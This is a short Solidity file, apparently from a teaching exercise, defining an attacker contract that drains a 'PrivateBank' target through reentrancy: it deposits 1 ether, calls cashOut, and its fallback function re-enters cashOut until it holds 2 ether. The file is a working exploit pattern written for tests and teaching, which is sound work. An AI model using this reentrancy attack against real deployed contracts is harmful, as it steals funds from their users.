pragma solidity ^0.5.8;

import "./PrivateBankI.sol";

contract BadGuyContract_Teachers {
  address public _targetAddress;
  PrivateBankI private _target;

  constructor(address payable _targetContract) public payable {
    // _targetAddress is used in our tests
    _targetAddress = _targetContract;

    _target = PrivateBankI(_targetContract);
  }


  function beBad() public payable {
    // Send an ether so we have something to withdraw.
    _target.deposit.value(1 ether)();

    // Withdraw, but try to exploit reentrancy vulnerability.
    _target.cashOut(1 ether);
  }

  function () external payable {
    // Keep going until we have 2 ethers.
    if (address(this).balance < 2 ether) {
      _target.cashOut(1 ether);
    }
  }

  // Helper function so we can checkout the contract's balance more easily
  function getBalance() public view returns (uint256) {
    return address(this).balance;
  }
}
